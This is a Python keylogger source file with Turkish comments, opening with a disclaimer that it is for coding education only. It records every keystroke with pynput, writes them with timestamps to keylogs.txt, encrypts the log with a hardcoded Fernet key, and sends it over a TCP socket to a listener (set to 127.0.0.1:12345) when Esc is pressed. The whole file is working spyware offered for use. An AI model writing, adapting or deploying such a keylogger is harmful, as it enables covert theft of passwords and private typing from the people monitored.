#Kötü amaçlar için kullanmayınız sadece kodlama eğitimi amaçlı geliştirilmiştir.

from pynput import keyboard
import socket
import datetime as dt
from cryptography.fernet import Fernet

log_list_alphabetic = []
log_list_key = []
log_file = "keylogs.txt"  # Basılan tuşları kaydetmek için bir dosya. Bunu kendi sisteminizde görün diye koyduk.

key = b'Lp5m5bDamhp_0rGDFF1LE-UsFwz0tt6CFPKTYuLmfxI='  # Bunu bir kez oluşturup hem sunucuda hem istemcide kullanın
cipher_suite = Fernet(key)

# Şifreleme Fonksiyonu
def encrypt_message(message):
    encrypted_message = cipher_suite.encrypt(message.encode())
    return encrypted_message

def send_logs():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Socket oluşturma
    target = "127.0.0.1"
    port = 12345

    try:
        s.connect((target, port))
        # Dosyayı okuma
        with open(log_file, "r") as f:
            data = f.read()
        enc_data = encrypt_message(data)
        if not enc_data:
            print("Veri boş, gönderilemiyor")
        else:
            s.send(enc_data)  # Dosya içeriğini gönderiyoruz
            print("Veri gönderildi")
    except Exception as e:
        print(f"Hata oluştu: {e}")
    finally:
        s.close()  # Bağlantıyı kapatma

def on_press(key):
    try:
        log_list_alphabetic.append(key.char)  # Normal karakterler
    except AttributeError:
        log_list_key.append(str(key))  # Özel tuşlar için (Shift, Enter, Ctrl, vs.)

def on_release(key):
    if key == keyboard.Key.esc:
        # Logları gönder
        if log_list_alphabetic or log_list_key:
            with open(log_file, 'a') as f:
                f.write(f"Yazılış tarihi: {dt.datetime.now()} \n")
                if log_list_alphabetic:
                    f.write(f"Karakterler: {log_list_alphabetic} \n")
                if log_list_key:
                    f.write(f"Tuşlar: {log_list_key} \n")
            log_list_alphabetic.clear()
            log_list_key.clear()
        send_logs()
        return False

# Klavye dinlemeyi başlat
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

